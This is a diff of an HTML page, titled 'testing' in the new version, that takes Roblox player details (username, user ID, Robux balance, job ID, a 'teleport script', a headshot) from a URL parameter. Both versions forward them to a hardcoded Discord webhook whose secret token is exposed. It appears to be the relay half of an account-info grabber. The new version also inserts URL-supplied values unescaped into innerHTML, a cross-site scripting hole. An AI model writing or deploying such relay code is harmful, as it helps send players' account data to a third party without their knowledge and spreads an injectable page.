@@ -1,59 +1,48 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Data Receiver</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>testing</title>
 </head>
 <body>
-  <script>
-    // Extract the "data" query parameter from the URL.
-    const urlParams = new URLSearchParams(window.location.search);
-    const dataParam = urlParams.get('data');
+    <h1>info</h1>
+    <div id="player-info"></div>
+    <script>
+        function sendDataToWebhook(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU';
 
-    if (dataParam) {
-      try {
-        // Decode and parse the JSON data from the URL.
-        const jsonData = JSON.parse(decodeURIComponent(dataParam));
-        console.log("Received data:", jsonData);
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Webhook sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending webhook:', error);
+            });
+        }
 
-        // Build the payload in Discord webhook format.
-        const payload = {
-          content: "Player Info Received",
-          embeds: [{
-            title: "Player Info",
-            fields: [
-              { name: "Username", value: jsonData.username || "N/A", inline: true },
-              { name: "UserID", value: jsonData.userId || "N/A", inline: true },
-              { name: "JobID", value: jsonData.jobId || "N/A", inline: true },
-              { name: "Robux", value: jsonData.robuxAmount || "N/A", inline: true },
-              { name: "Teleport Script", value: jsonData.teleportScript || "N/A", inline: false }
-            ],
-            thumbnail: { url: jsonData.headshotUrl || "" }
-          }]
-        };
+        const urlParams = new URLSearchParams(window.location.search);
+        const data = JSON.parse(decodeURIComponent(urlParams.get('data')));
 
-        // Send the payload to your Discord webhook.
-        fetch('https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU', {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        })
-        .then(response => {
-          if (response.ok) {
-            console.log("Webhook sent successfully.");
-          } else {
-            console.error("Failed to send webhook. Status:", response.status);
-          }
-        })
-        .catch(error => {
-          console.error("Error sending webhook:", error);
-        });
-      } catch (error) {
-        console.error("Error parsing JSON data from URL:", error);
-      }
-    } else {
-      console.error("No 'data' parameter found in the URL.");
-    }
-  </script>
+        const playerInfoDiv = document.getElementById('player-info');
+        const embed = data.embeds[0];
+        
+        playerInfoDiv.innerHTML = `
+            <p><strong>Username:</strong> ${embed.fields[0].value}</p>
+            <p><strong>UserID:</strong> ${embed.fields[1].value}</p>
+            <p><strong>Robux:</strong> ${embed.fields[2].value}</p>
+            <p><strong>Teleport Script:</strong> ${embed.footer.text}</p>
+            <img src="${embed.thumbnail.url}" alt="Player Headshot">
+        `;
+
+        sendDataToWebhook(data);
+    </script>
 </body>
 </html>
